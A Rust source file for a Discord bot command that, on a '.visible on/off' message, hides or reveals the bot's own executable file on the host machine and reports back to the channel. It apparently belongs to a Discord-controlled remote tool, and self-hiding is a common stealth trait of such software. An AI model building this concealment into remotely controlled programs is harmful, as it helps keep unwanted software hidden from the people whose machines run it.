use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use std::env;

use hf::{hide, show};

pub struct VisibleCommand;

#[async_trait]
impl BotCommand for VisibleCommand {
    fn name(&self) -> &str { "visible" }
    fn description(&self) -> &str { "Show or hide the executable file" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".visible <on|off>" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".visible on",
            ".visible off",
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["vis", "hide"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(a) => a.to_lowercase(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.visible <on|off>`")
                    .await?;
                return Ok(());
            }
        };

        let enable = match action.as_str() {
            "on" | "show" | "visible" => true,
            "off" | "hide" | "invisible" => false,
            _ => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Action must be `on` or `off`")
                    .await?;
                return Ok(());
            }
        };

        let current_exe_path = env::current_exe()?;

        if enable {
            match show(&current_exe_path) {
                Ok(_) => {
                    http.create_message(msg.channel_id)
                        .content("Successfully made executable visible")
                        .await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id)
                        .content(&format!("Failed to show executable: {}", e))
                        .await?;
                }
            }
        } else {
            match hide(&current_exe_path) {
                Ok(_) => {
                    http.create_message(msg.channel_id)
                        .content("Successfully hid executable")
                        .await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id)
                        .content(&format!("Failed to hide executable: {}", e))
                        .await?;
                }
            }
        }

        Ok(())
    }
}
